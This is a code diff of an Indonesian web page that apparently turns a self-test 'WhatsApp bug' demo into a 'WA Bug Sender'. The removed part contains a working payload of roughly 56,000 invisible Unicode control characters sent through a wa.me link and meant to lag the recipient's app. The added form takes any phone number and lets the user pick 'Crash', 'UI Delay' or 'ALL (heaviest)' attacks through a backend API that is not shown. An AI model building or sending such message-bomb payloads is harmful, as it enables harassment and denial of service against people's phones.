@@ -1,60 +1,41 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>zionixHard</title>
+  <meta charset="UTF-8" />
+  <title>WhatsApp Bug Sender</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-      background-color: #f0f0f0;
-    }
-    input {
-      padding: 12px;
-      font-size: 16px;
-      width: 280px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      margin-bottom: 20px;
-    }
-    button {
-      padding: 12px 24px;
-      background-color: #25D366;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #128C7E;
-    }
+    body { font-family: sans-serif; text-align: center; padding: 30px; }
+    textarea, input, select { width: 300px; margin: 10px; padding: 10px; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
   </style>
 </head>
 <body>
-  <h1>🧪 zionixHard</h1>
-  <p>Masukkan nomor WhatsApp kamu sendiri:</p>
-  <input type="text" id="nomor" placeholder="Contoh: 6281234567890"><br>
-  <button onclick="kirim()">Kirim Uji Coba</button>
+  <h1>WA Bug Sender (Unicode)</h1>
+  <form id="form">
+    <input type="text" id="number" placeholder="Nomor WA (62xxxx)" required /><br />
+    <select id="bugtype">
+      <option value="blank">Blank</option>
+      <option value="ui_delay">UI Delay</option>
+      <option value="crash">Crash</option>
+      <option value="all_combined">ALL (Paling Berat)</option>
+    </select><br />
+    <button type="submit">Kirim Bug</button>
+  </form>
+  <div id="status"></div>
 
   <script>
-    const whitelist = ["6281234567890", "6281234567890"]; // ← masukkan nomor kamu sendiri
-
-    const bug = (
-      "\u200F\u200E\u202E\u202A\u202D\u202B\u200B\u200C\u200D\u2063\u2060\uFEFF\u061C\u00AD"
-    ).repeat(4000); // ~60.000 invisible chars (UI delay bug)
-
-    function kirim() {
-      const nomor = document.getElementById("nomor").value.trim();
-      if (!whitelist.includes(nomor)) {
-        alert("Nomor tidak diizinkan (whitelist). Edit dulu jika ingin menambahkan.");
-        return;
-      }
-
-      const waLink = `https://wa.me/${nomor}?text=${encodeURIComponent(bug)}`;
-      window.location.href = waLink;
-    }
+    document.getElementById('form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const number = document.getElementById('number').value;
+      const bugtype = document.getElementById('bugtype').value;
+      const res = await fetch('/api/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ number, bugtype })
+      });
+      const data = await res.json();
+      document.getElementById('status').innerText = data.message;
+    });
   </script>
 </body>
 </html>
